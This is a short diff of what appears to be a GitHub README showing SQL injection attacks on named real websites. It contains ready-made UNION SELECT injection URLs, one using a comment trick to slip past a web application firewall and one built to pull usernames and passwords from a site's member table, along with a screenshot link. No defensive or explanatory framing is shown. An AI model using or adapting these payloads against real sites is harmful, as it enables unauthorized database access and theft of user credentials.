@@ -17,7 +17,8 @@ https://tsoad.edu.pk/blog-detail.php?id=-29'   /*!50000Union*/ Select 1,concat(e
  
 
 
-3.http://www.igoergo.com/_site/about.php?id=4%20%20Union%20Select%201,2,Concat(username,%200x3d3d,password),4,5,6%20from%20member
+3.
+http://www.igoergo.com/_site/about.php?id=4%20%20Union%20Select%201,2,Concat(username,%200x3d3d,password),4,5,6%20from%20member
 ![3](https://github.com/AfrinShahana/sqli-waf-website-and-dump-data/assets/123531000/6668b8c8-bf8d-43ed-aefc-8e679e7c5c43)
  
 
